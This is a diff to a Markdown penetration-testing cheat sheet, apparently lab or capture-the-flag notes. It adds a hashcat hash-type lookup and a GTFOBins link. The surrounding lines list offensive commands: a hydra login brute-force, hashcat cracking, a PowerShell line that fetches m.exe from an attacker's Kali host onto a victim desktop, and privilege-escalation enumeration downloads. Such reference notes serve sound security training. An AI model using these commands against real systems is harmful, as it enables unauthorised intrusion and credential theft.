@@ -23,6 +23,7 @@
 * `hydra -l {username} -P {password file} {base url or ip} -s{port} http-post-form "/index.php:user=^USER^&password=^PASS^:{failed string}"`  _Brute force http post login with hydra_
 * [figure out hash types](https://hashcat.net/wiki/doku.php?id=example_hashes) _page with example hashes and their hashcat type/code_
 * `hashcat -m {hashtype} hashes.txt ~/Documents/git/SecLists/Passwords/*.txt --force`  _try cracking all hashes in hashes.txt against all seclist password text files, using no gpu_
+* `hashcat --example-hashes | grep {piece of hash}` _search the hashcat examples to try and determine a hash type and the code to use for cracking with hashcat_
 
 ## Priv Esc Windows
 * `powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://{kali_ip}:8080/m.exe', 'c:\users\victim\desktop\m.exe') }"` _Powershell download a file_
@@ -52,6 +53,7 @@
 * `wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl` _Download exploit suggester_
 * `wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh` _Download linux enumeration script_
 * `wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64` _Download 64 bit version of pspy for monitoring processes that might run as root_
+* [GTFO bins](https://gtfobins.github.io/) _Search for ways to abuse binaries.  Useful for sudo or suid programs to spawn shell etc_
 
 ## Pric Esc Generic
 * `run post/multi/recon/local_exploit_suggester` _Check for local priv esc exploits.  Must be interacting with meterpreter session_
